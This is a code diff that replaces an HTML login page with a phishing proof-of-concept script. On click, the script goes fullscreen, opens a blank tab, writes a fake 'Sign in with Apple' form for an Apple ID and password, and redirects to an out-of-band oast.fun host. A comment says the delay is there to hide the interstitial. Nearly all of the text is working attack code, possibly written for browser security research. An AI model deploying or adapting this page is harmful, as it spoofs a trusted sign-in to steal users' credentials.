@@ -1,89 +1,63 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Secure Login</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <style>
-    html, body {
-      margin: 0; padding: 0;
-      width: 100vw; height: 100vh;
-      background: black;
-      color: white;
-      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-      display: flex; align-items: center; justify-content: center;
-    }
+<script>
+document.getElementById('start').onclick = async () => {
+  await document.documentElement.requestFullscreen();
 
-    #start {
-      background: #1a73e8;
-      padding: 1em 2em;
-      border-radius: 8px;
-      font-size: 18px;
-      cursor: pointer;
-      color: white;
-      border: none;
-    }
-  </style>
-</head>
-<body>
-  <button id="start">Login with Apple</button>
+  // Open blank tab with inherited origin
+  const phishingWin = window.open('', '_blank');
 
-  <script>
-    document.getElementById('start').onclick = async () => {
-      await document.documentElement.requestFullscreen();
-
-      const phishingWin = window.open("about:blank", "_blank", "noopener");
-
-      phishingWin.document.write(`
-        <style>
-          html, body {
-            margin: 0; padding: 0;
-            width: 100vw; height: 100vh;
-            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-            background: #f2f2f7;
-          }
-          .navbar {
-            background: white;
-            height: 44px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 500;
-            box-shadow: 0 1px 0 #ccc;
-          }
-          .content {
-            padding: 20px;
-          }
-          input {
-            width: 100%;
-            padding: 10px;
-            font-size: 16px;
-            margin-top: 10px;
-          }
-          button {
-            margin-top: 20px;
-            padding: 10px;
-            background: #1a73e8;
-            color: white;
-            border: none;
-            width: 100%;
-            font-size: 16px;
-            border-radius: 8px;
-          }
-        </style>
-        <div class="navbar">Sign in with Apple</div>
-        <div class="content">
-          <p>Enter your Apple ID credentials</p>
-          <input type="text" placeholder="Apple ID">
-          <input type="password" placeholder="Password">
-          <button>Continue</button>
-        </div>
-
-        <script>
-          // Delay phishing redirection to hide interstitial
-          setTimeout(() => location.replace("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/login"), 200);
-        <\/script>
-      `);
-    };
-  </script>
-</body>
-</html>
+  // Wait for rendering context to stabilize
+  setTimeout(() => {
+    phishingWin.document.open();
+    phishingWin.document.write(`
+      <style>
+        html, body {
+          margin: 0;
+          font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+          background: #f2f2f7;
+          width: 100vw;
+          height: 100vh;
+        }
+        .navbar {
+          background: white;
+          height: 44px;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          font-weight: 500;
+          box-shadow: 0 1px 0 #ccc;
+        }
+        .content {
+          padding: 20px;
+        }
+        input {
+          width: 100%;
+          padding: 10px;
+          font-size: 16px;
+          margin-top: 10px;
+        }
+        button {
+          margin-top: 20px;
+          padding: 10px;
+          background: #1a73e8;
+          color: white;
+          border: none;
+          width: 100%;
+          font-size: 16px;
+          border-radius: 8px;
+        }
+      </style>
+      <div class="navbar">Sign in with Apple</div>
+      <div class="content">
+        <p>Enter your Apple ID credentials</p>
+        <input type="text" placeholder="Apple ID">
+        <input type="password" placeholder="Password">
+        <button>Continue</button>
+      </div>
+      <script>
+        setTimeout(() => location.replace("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun.com"), 300);
+      <\/script>
+    `);
+    phishingWin.document.close();
+  }, 100); // allow rendering context to establish
+};
+</script>
